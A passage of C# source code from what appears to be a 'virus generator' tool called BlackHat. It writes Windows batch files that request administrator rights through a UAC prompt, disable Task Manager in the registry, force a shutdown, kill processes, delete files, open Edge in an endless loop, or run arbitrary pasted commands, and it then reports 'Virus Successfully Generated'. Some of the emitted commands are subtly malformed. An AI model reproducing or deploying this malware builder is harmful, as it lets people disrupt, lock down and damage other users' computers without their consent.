                            sw.Write("\ntaskkill /f /im " + AppNameBox.Text);
                        }
                        else
                        if (MessageCheck.Checked)
                        {
                            sw.Write("\necho Msgbox\"" + Messagetext.Text + "\",48+1,\"" + Messagetext.Text + "\"");
                        }
                        else
                        if (DisableTaskCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\nreg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System / v DisableTaskMgr / t REG_DWORD / d 1 / f\n");
                        }
                    }
                }
            }
            else
            if (MessageCheck.Checked)
            {
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    using (Stream s = File.Open(saveFileDialog1.FileName, FileMode.Create))
                    using (StreamWriter sw = new StreamWriter(s))
                    {
                        sw.Write("\necho Msgbox\""+ Messagetext.Text + "\",48+1,\"");

                        if (ShutdownBox.Checked)
                        {
                            sw.Write("\nshutdown\", \"/s /t 0\n");
                        }
                        else
                        if (CustomBATcheck.Checked)
                        {
                            sw.Write("@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\n" + richTextBox1.Text + "\n");
                        }
                        else
                        if (AppCheck.Checked)
                        {
                            sw.Write("\nstart " + Apptext.Text);
                        }
                        else
                        if (FileCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\n\\ndel \"" + deltext.Text + "\n");
                        }
                        else
                        if (Taskkillcheck.Checked)
                        {
                            sw.Write("\ntaskkill /f /im " + AppNameBox.Text);
                        }
                        else
                        if (CrashCheck.Checked)
                        {
                            sw.Write("\necho Msgbox\"" + Messagetext.Text + "\",48+1,\"" + Messagetext.Text + "\"");
                        }
                        else
                        if(DisableTaskCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\nreg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System / v DisableTaskMgr / t REG_DWORD / d 1 / f\n");
                        }
                    }
                }
            }
            else
            if (DisableTaskCheck.Checked)
            {
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    using (Stream s = File.Open(saveFileDialog1.FileName, FileMode.Create))
                    using (StreamWriter sw = new StreamWriter(s))
                    {
                        sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\nreg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System / v DisableTaskMgr / t REG_DWORD / d 1 / f\n");

                        if (ShutdownBox.Checked)
                        {
                            sw.Write("\nshutdown\", \"/s /t 0\n");
                        }
                        else
                        if (CustomBATcheck.Checked)
                        {
                            sw.Write("@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\n" + richTextBox1.Text + "\n");
                        }
                        else
                        if (AppCheck.Checked)
                        {
                            sw.Write("\nstart " + Apptext.Text);
                        }
                        else
                        if (FileCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n\r\n:: BatchGotAdmin\r\n:-------------------------------------\r\nREM  --> Check for permissions\r\n    IF \"%PROCESSOR_ARCHITECTURE%\" EQU \"amd64\" (\r\n>nul 2>&1 \"%SYSTEMROOT%\\SysWOW64\\cacls.exe\" \"%SYSTEMROOT%\\SysWOW64\\config\\system\"\r\n) ELSE (\r\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\r\n)\r\n\r\nREM --> If error flag set, we do not have admin.\r\nif '%errorlevel%' NEQ '0' (\r\n    echo Requesting administrative privileges...\r\n    goto UACPrompt\r\n) else ( goto gotAdmin )\r\n\r\n:UACPrompt\r\n    echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\r\n    set params= %*\r\n    echo UAC.ShellExecute \"cmd.exe\", \"/c \"\"%~s0\"\" %params:\"=\"\"%\", \"\", \"runas\", 1 >> \"%temp%\\getadmin.vbs\"\r\n\r\n    \"%temp%\\getadmin.vbs\"\r\n    del \"%temp%\\getadmin.vbs\"\r\n    exit /B\r\n\r\n:gotAdmin\r\n    pushd \"%CD%\"\r\n    CD /D \"%~dp0\"\r\n:--------------------------------------    \r\n\\ndel \"" + deltext.Text + "\n");
                        }
                        else
                        if (Taskkillcheck.Checked)
                        {
                            sw.Write("\ntaskkill /f /im " + AppNameBox.Text);
                        }
                        else
                        if (CrashCheck.Checked)
                        {
                            sw.Write("\n@echo off\r\n:start\r\nmsedge.exe\r\ngoto start\n");
                        }
                        else
                        if (MessageCheck.Checked)
                        {
                            sw.Write("\necho Msgbox\"" + Messagetext.Text + "\",48+1,\"" + Messagetext.Text + "\"");
                        }
                    }
                }
            }
            MessageBox.Show("Virus Successfully Generated", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            WebClient client = new WebClient();
            string version = client.DownloadString("https://raw.githubusercontent.com/MavenCoding157/BlackHat/main/Version.txt");
            if (version.Contains(CurrentVersion))
            {
                MessageBox.Show("BlackHat Is Up To Date", "Update", MessageBoxButtons.OK,MessageBoxIcon.Information);
            }
            else
            {
                MessageBox.Show("Please update to a newer version.", "Update", MessageBoxButtons.OK,MessageBoxIcon.Information);
                System.Diagnostics.Process.Start("https://github.com/MavenCoding157/BlackHat");
            }
        }
    }
}
